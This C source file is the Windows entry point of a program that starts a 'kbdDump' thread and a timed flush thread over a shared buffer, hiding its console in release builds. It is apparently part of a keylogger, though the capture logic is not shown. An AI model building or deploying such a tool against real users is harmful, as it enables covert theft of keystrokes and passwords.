#include <windows.h>

#include "shared.h"
#include "kbdHandler.h"
#include "timer.h"

#ifndef DEBUG
int WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine,
    int       nShowCmd
)
#else
int main()
#endif
{
    // Create Mutex for Synchronization on access to Buffer and Index in kbdDump and handleTimer threads
    Mutex = CreateMutex(NULL, FALSE, NULL);
    if (Mutex == NULL)
    {
#ifdef DEBUG
        handleError("CreateMutex");
#endif
        return -1;
    }

    GetSystemTimeAsFileTime(&LastFlush);

    // Create kbdDump Thread
    DWORD kbdDumpTID;
    HANDLE kbdDumpT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)kbdDump, 0, 0, &kbdDumpTID);
    if (kbdDumpT == NULL)
    {
#ifdef DEBUG
        handleError("CreateThread");
#endif
        return -1;
    }

    // Create handleTimer Thread
    DWORD handleTimerTID;
    HANDLE handleTimerT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handleTimer, 0, 0, &handleTimerTID);
    if (handleTimerT == NULL)
    {
#ifdef DEBUG
        handleError("CreateThread");
#endif
        return -1;
    }

    // Wait for Threads to Finish
    HANDLE threads[] = { handleTimerT, kbdDumpT };
    WaitForMultipleObjects(2, threads, TRUE, INFINITE);

    // Close Handles for Cleanup
    CloseHandle(handleTimerT);
    CloseHandle(kbdDumpT);
    CloseHandle(Mutex);

    return 0;
}
